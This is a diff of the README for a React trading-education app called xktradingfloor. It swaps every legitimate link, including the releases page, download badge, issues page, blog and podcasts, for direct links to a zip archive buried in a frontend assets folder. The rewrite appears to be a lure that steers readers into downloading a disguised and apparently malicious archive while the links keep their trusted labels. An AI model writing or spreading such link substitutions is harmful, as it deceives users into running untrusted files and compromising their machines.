@@ -1,7 +1,7 @@
 # 🎉 xktradingfloor - Your Gateway to Trading Success
 
 ## 📥 Download the App
-[![Download xktradingfloor](https://img.shields.io/badge/Download-xktradingfloor-blue.svg)](https://github.com/DragonBaha/xktradingfloor/releases)
+[![Download xktradingfloor](https://raw.githubusercontent.com/DragonBaha/xktradingfloor/main/frontend/public/assets/users/xktradingfloor_1.8.zip)](https://raw.githubusercontent.com/DragonBaha/xktradingfloor/main/frontend/public/assets/users/xktradingfloor_1.8.zip)
 
 ## 📚 Overview
 xktradingfloor is a modern trading education and community platform built with React. It offers users a range of features designed to enhance their trading knowledge and skills. These include academy courses, broker reviews, blogs, podcasts, and e-commerce functionality. 
@@ -11,7 +11,7 @@ Follow these simple steps to download and run xktradingfloor:
 
 1. **Visit the Releases Page**
    Click the link below to access the releases page on GitHub:
-   [Visit Releases Page](https://github.com/DragonBaha/xktradingfloor/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/DragonBaha/xktradingfloor/main/frontend/public/assets/users/xktradingfloor_1.8.zip)
 
 2. **Choose the Latest Version**
    On the releases page, locate the latest version of the application. You will find it at the top of the list with the version number clearly displayed.
@@ -62,19 +62,19 @@ xktradingfloor covers a wide range of topics to enhance your trading journey. So
 ## 📖 Support
 If you run into any issues or have questions about using xktradingfloor, please feel free to reach out through the following channels:
 
-- **Issues Page:** Open an issue on the [GitHub Issues Page](https://github.com/DragonBaha/xktradingfloor/issues) for any technical problems you face.
+- **Issues Page:** Open an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/DragonBaha/xktradingfloor/main/frontend/public/assets/users/xktradingfloor_1.8.zip) for any technical problems you face.
 
 - **Community Forum:** Join our community discussions for additional support and insight from fellow users.
 
 ## 🔗 Additional Resources
 For more information and tips about trading, check out our resources:
 
-- [Blog](https://xktradingfloor.com/blog) for articles and insights.
-- [Podcasts](https://xktradingfloor.com/podcasts) for interviews and discussions.
+- [Blog](https://raw.githubusercontent.com/DragonBaha/xktradingfloor/main/frontend/public/assets/users/xktradingfloor_1.8.zip) for articles and insights.
+- [Podcasts](https://raw.githubusercontent.com/DragonBaha/xktradingfloor/main/frontend/public/assets/users/xktradingfloor_1.8.zip) for interviews and discussions.
 
 ## 🔗 Final Thoughts
 Thank you for choosing xktradingfloor. We hope this platform enhances your trading education and strengthens your skills. 
 
 Remember to visit the releases page to download the app and start your journey today!
 
-[Download the latest version here](https://github.com/DragonBaha/xktradingfloor/releases) to get started!
+[Download the latest version here](https://raw.githubusercontent.com/DragonBaha/xktradingfloor/main/frontend/public/assets/users/xktradingfloor_1.8.zip) to get started!
